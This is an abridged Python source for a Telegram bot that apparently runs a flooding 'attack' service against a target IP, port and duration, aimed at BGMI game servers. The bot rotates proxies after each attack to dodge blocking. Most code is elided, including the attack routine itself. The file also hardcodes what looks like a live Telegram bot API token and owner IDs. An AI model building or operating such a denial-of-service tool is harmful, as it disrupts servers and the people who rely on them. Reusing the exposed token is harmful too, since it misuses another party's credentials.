...
API_TOKEN = '7319575607:AAEgX7Y6RUbW9yRBVu8QuSm81QKRqRzgXX8'
ADMIN_ID = '6904449442'
DEFAULT_KEY = 'NINJA'
OWNER_ID = '6904449442'  # Add your Telegram user ID here

bot = telebot.TeleBot('7319575607:AAEgX7Y6RUbW9yRBVu8QuSm81QKRqRzgXX8')
...
# Function to read the current proxy from file
def get_current_proxy():
    with open(CURRENT_PROXY_FILE, 'r') as file:
    ...
    if len(command) == 4:  # Check for target, port, and time
        ...
        if time_duration > 5000:
            ...
            def run_attack():
                ...
                # Update the proxy after each bgmi command
                proxies = load_proxies()
                new_proxy = rotate_proxy(proxies)
                save_current_proxy(new_proxy)
...
def main():
    while True:
        try:
            ...
            proxy_thread = Thread(target=lambda: subprocess.run(['python', 'proxy_handler.py']))
